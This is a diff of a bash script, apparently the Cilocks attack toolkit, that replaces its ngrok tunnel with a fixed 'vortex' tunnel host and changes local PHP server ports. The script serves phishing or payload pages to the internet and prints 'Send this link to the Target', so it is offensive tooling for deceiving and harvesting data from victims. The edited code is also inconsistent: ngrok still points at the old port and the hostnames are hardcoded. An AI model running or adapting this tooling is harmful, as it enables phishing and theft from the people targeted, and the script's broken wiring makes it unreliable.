@@ -764,13 +764,13 @@ elif [[ $select == 13 ]]; then
   fi
 
   echo -e "${lh}[*] Starting php server...${n}"
-  php -t "info/" -S 127.0.0.1:3333 > /dev/null 2>&1 &
+  php -t "info/" -S 127.0.0.1:8080 > /dev/null 2>&1 &
   sleep 2
   echo -e "${lh}[*] Starting ngrok server...${n}"
   ./ngrok http 3333 > /dev/null 2>&1 &
   sleep 10
 
-  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://user9f32ef018a0bca0.app.vtxhub.com")
   echo -e "${lb}[*] Send this link to the Target:${n}" $link
   checkfound
   }
@@ -881,7 +881,7 @@ elif [[ $select == 14 ]]; then
 
   payload_ngrok() {
 
-  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://user9f32ef018a0bca0.app.vtxhub.com")
   sed 's+forwarding_link+'$link'+g' tmp.html > index2.html
   sed 's+forwarding_link+'$link'+g' tmp.php > index.php
 
@@ -891,47 +891,13 @@ elif [[ $select == 14 ]]; then
   ngrok_server() {
 
 
-  if [[ -e ngrok ]]; then
-  echo ""
-  else
-  command -v unzip > /dev/null 2>&1 || { echo >&2 "${lh}Cilocks require unzip but it's not installed. Install it. Aborting.${lh}"; exit 1; }
-  command -v wget > /dev/null 2>&1 || { echo >&2 "${lh}Cilocks require wget but it's not installed. Install it. Aborting.${lh}"; exit 1; }
-  echo -e "${m} Downloading Ngrok...${n}\n"
-  arch=$(uname -a | grep -o 'arm' | head -n1)
-  arch2=$(uname -a | grep -o 'Android' | head -n1)
-  if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-  wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-  if [[ -e ngrok-stable-linux-arm.zip ]]; then
-  unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-  chmod +x ngrok
-  rm -rf ngrok-stable-linux-arm.zip
-  else
-  echo -e "${m}[!] Download error... Termux?Nethunter?, run: pkg install wget${n}"
-  exit 1
-  fi
-
-  else
-  wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
-  if [[ -e ngrok-stable-linux-386.zip ]]; then
-  unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-  chmod +x ngrok
-  rm -rf ngrok-stable-linux-386.zip
-  else
-  echo -e "${m}[!] Download error...${n} "
-  exit 1
-  fi
-  fi
-  fi
-
   echo -e "${lh} [*] Starting php server...${n}"
-  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+  php -S 127.0.0.1:8080 > /dev/null 2>&1 &
   sleep 2
-  echo -e "${lh} [*] Starting ngrok server...${n}"
-  ./ngrok http 3333 > /dev/null 2>&1 &
-  sleep 10
+  ./vortex --site user9f32ef018a0bca0.app.vtxhub.com --provider http --host localhost --port 8080  & sleep 1
+  sleep 5
 
-  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "http://user9f32ef018a0bca0.app.vtxhub.com")
   echo -e "${lb} [*] Send this link to the Target:${n}" $link
 
   payload_ngrok
